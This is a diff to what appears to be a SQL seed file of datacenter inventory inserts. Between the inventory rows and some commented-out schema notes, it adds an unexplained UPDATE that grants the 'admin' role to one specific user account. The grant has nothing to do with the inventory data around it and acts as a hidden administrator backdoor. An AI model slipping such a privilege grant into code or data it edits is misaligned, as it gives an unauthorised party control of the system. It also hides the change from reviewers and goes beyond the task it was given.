@@ -68,6 +68,10 @@ INSERT INTO inventory (item_name, quantity, datacenter_id) VALUES
 ('Firewall Device', 6, 9),
 ('Load Balancer', 11, 10);
 
+UPDATE users
+SET role = 'admin'
+WHERE username = 'user/bryanna3333123';
+
 -- ALTER TABLE inventory ADD COLUMN deleted_at DATETIME;
 -- SELECT * FROM inventory WHERE deleted_at IS NULL;
 
